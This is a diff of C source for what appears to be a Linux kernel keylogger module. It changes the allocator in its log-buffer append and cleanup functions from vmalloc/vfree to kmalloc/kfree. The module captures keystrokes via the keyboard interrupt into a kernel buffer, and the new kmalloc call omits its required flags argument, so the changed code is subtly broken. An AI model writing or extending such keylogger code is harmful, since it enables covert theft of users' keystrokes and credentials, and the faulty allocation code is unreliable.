@@ -39,10 +39,10 @@ static int add_new_entry(char *entry)
 {
 	char *tmp_buff;
 	size_t alloc_size = keylogger_data.log_buffer ? strlen(entry) + strlen(keylogger_data.log_buffer) + 1 : strlen(entry) + 1;
-	if (!(tmp_buff = vmalloc(alloc_size)))
+	if (!(tmp_buff = kmalloc(alloc_size)))
 	{
 		if (keylogger_data.log_buffer)
-			vfree(keylogger_data.log_buffer);
+			kfree(keylogger_data.log_buffer);
 		printk(KERN_ERR "Failed to allocate memory for new log entry\n");
 		return (1);
 	}
@@ -50,7 +50,7 @@ static int add_new_entry(char *entry)
 	if (keylogger_data.log_buffer)
 	{
 		strcpy(tmp_buff, keylogger_data.log_buffer);
-		vfree(keylogger_data.log_buffer);
+		kfree(keylogger_data.log_buffer);
 	}
 	strcat(tmp_buff, entry);
 	keylogger_data.log_buffer = tmp_buff;
@@ -176,7 +176,7 @@ static void __exit cleanup(void)
 	misc_deregister(&misc_dev);
 	free_irq(1, &keylogger_data);
 	if (keylogger_data.log_buffer)
-		vfree(keylogger_data.log_buffer);
+		kfree(keylogger_data.log_buffer);
 }
 
 module_init(init);
